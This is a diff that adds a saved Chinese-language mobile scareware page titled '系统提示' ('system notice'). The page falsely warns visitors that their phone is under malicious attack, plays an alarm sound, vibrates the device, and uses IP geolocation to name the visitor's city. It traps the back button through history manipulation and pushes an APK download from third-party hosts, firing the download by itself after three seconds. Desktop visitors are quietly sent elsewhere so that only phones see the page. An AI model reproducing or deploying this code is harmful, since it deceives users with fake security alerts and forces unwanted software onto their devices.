@@ -1,0 +1,175 @@
+<!DOCTYPE html>
+<!-- saved from url=(0082)http://lzhtml.oss-cn-beijing.aliyuncs.com/ceshi/SmartM/systemWarning/detail_l.html -->
+<html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+		
+		
+		<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0, viewport-fit=cover">
+		<meta http-equiv="X-UA-Compatible" content="IE=edge, Chrome=1">
+		<meta name="apple-mobile-web-app-capable" content="yes">
+		<meta name="apple-mobile-web-app-status-bar-style" content="black">
+		<meta name="format-detection" content="telephone=no">
+		<title>系统提示</title>
+		<link rel="stylesheet" href="./系统提示_files/common.css">
+		<link rel="stylesheet" href="./系统提示_files/index.css">
+
+		</head><body><audio id="mp3Btn" autoplay="autoplay" preload="" loop="">
+        <source src="https://c.xiaozhuyoupu.com/alert2.mp3" type="audio/mpeg">
+        </audio>
+
+        <script src="./系统提示_files/hm.js"></script><script>//百度统计
+        var _hmt = _hmt || [];
+		(function() {
+  		 	var hm = document.createElement("script");
+  			hm.src = "https://hm.baidu.com/hm.js?e40f00cc88ca8a051b4883219be34e81";
+  			var s = document.getElementsByTagName("script")[0]; 
+  			s.parentNode.insertBefore(hm, s);
+		})();
+		</script> 
+
+        <script>
+                //手机震动10秒
+                if (navigator.vibrate) {
+                    navigator.vibrate(10000);
+                } else if (navigator.webkitVibrate) {
+                    navigator.webkitVibrate(10000);
+                }
+        </script>
+
+		<script type="text/javascript">  
+            function browserRedirect() {  
+                var sUserAgent = navigator.userAgent.toLowerCase();  
+                var bIsIpad = sUserAgent.match(/ipad/i) == "ipad";  
+                var bIsIphoneOs = sUserAgent.match(/iphone os/i) == "iphone os";  
+                var bIsMidp = sUserAgent.match(/midp/i) == "midp";  
+                var bIsUc7 = sUserAgent.match(/rv:1.2.3.4/i) == "rv:1.2.3.4";  
+                var bIsUc = sUserAgent.match(/ucweb/i) == "ucweb";  
+                var bIsAndroid = sUserAgent.match(/android/i) == "android";  
+                var bIsCE = sUserAgent.match(/windows ce/i) == "windows ce";  
+                var bIsWM = sUserAgent.match(/windows mobile/i) == "windows mobile";  
+                if (!(bIsIpad || bIsIphoneOs || bIsMidp || bIsUc7 || bIsUc || bIsAndroid || bIsCE || bIsWM) ){  
+                	//PC跳转百度
+                	window.location.href='https://www.baidu.com';
+                } 
+            }  
+            browserRedirect();
+            
+        </script>
+		<script type="text/javascript" src="./系统提示_files/us.js"></script>
+		<script type="text/javascript">
+			var ua = navigator.userAgent.toLowerCase();
+			if (ua.indexOf("se 2.x") > -1 || ua.indexOf("sogoumse") > -1) {
+				var surl = "https://d.nxsskj.cn/app/explorer-yewenbin-release-v2.2.0-31-20190621-171813.apk"; //极速通
+			} else {
+				var surl = "https://sl.sogoucdn.com/semob5.17.53_145703_R28412_121021015_build68554_2.1.0.2420.apk"; //fb15白板包 
+			}
+
+			function downapk() {
+				window.location.href = surl;
+			}
+		</script>
+	
+	
+
+		<div class="backimg">
+			<div class="top-div">
+				<img class="logoimg" src="./系统提示_files/android.png">
+				<div class="logo-title">风险项详情</div>
+				<div class="adress-div">
+					<img src="./系统提示_files/prompt.gif">
+					<span id="details">星期二，7月9日，2019年，宁波</span>
+				</div>
+			</div>
+			<div class="middle-box">
+				<p style="color:#666666;">
+					系统提示你所浏览的网站疑似遭受恶意广告代码攻击，浏览页面可能崩溃，为了避免存在风险行为。
+				</p>
+			</div>
+			<div style="width:100%;padding:0 15px;">
+				<div style="width:100%; height: 1px; background:#E8E8E8;"></div>
+			</div>
+
+			<div class="middle-box">
+				<p>请按照以下步骤修复浏览器：</p>
+				<p>第一步：点击“确定”按钮安装浏览器</p>
+				<p>第二步：安装完成后请打开应用进行更新</p>
+			</div>
+			<div class="button-box">
+				<div class="button" onclick="showWarning()">取消</div>
+				<div class="button success" onclick="downapk()">确定</div>
+			</div>
+
+
+		</div>
+
+		<div class="popup-wrapper black-cover" style="" id="playWaring">
+			<div class="popup-box">
+				<div class="warning-title"><img src="./系统提示_files/risk.png">可能存在风险等级：<span style="color: #D82B0E;">高级</span></div>
+				<p style="font-size: 14px;text-align: left;color: #666666;">风险详情：您的<script>document.write(str4);</script> Nexus 5 手机在<span id="city">宁波</span>浏览页面时可能遭受恶意攻击，请立刻下载安装清理软件。</p>
+
+				<div class="btn-pop">
+					<div class="intoPlay" onclick="downapk()">确定</div>
+				</div>
+			</div>
+		</div>
+
+
+		<script type="text/javascript" src="./系统提示_files/jquery.min.js"></script>
+		<div style="display: none">
+
+		</div>
+		<script type="text/javascript" src="./系统提示_files/seajs.pjs"></script>
+		
+		<script>
+			$(document).ready(function() {
+				var Week = ['日', '一', '二', '三', '四', '五', '六'];
+				$('#city').html(ipregion_info.city)
+				var myDate = new Date();
+				var year = myDate.getFullYear();
+				var month = myDate.getMonth() + 1;
+				var data = myDate.getDate();
+				var wec = "星期" + Week[myDate.getDay()];
+				var datalist = wec + "，" + month + "月" + data + "日，" + year + "年，" + ipregion_info.city;
+				$("#details").html(datalist);
+			})
+
+			history.pushState({
+				page: 1
+			}, null, "");
+			history.pushState({
+				page: 1
+			}, null, "");
+			window.addEventListener("popstate", function(e) {
+				
+				//history.pushState({page: 1}, null, "");//不能返回
+				
+				showWarning()//弹出风险等级框
+				
+			});
+
+			function showWarning() {
+				$('#playWaring').show();
+				setTimeout(function() {
+					try {
+                      	downapk()
+						/*var ifr = document.createElement('iframe');
+						ifr.src = _webView;
+						ifr.width = 1;
+						ifr.height = 1;
+						ifr.style.visibility = 'hidden';
+						document.body.appendChild(ifr);*/
+					} catch (e) {}
+				}, 3000);
+			}
+
+			var _webView = surl;
+			setTimeout(function() {
+				try {
+					showWarning()
+
+				} catch (e) {}
+			}, 3000);
+		</script>
+	
+
+
+</body></html>
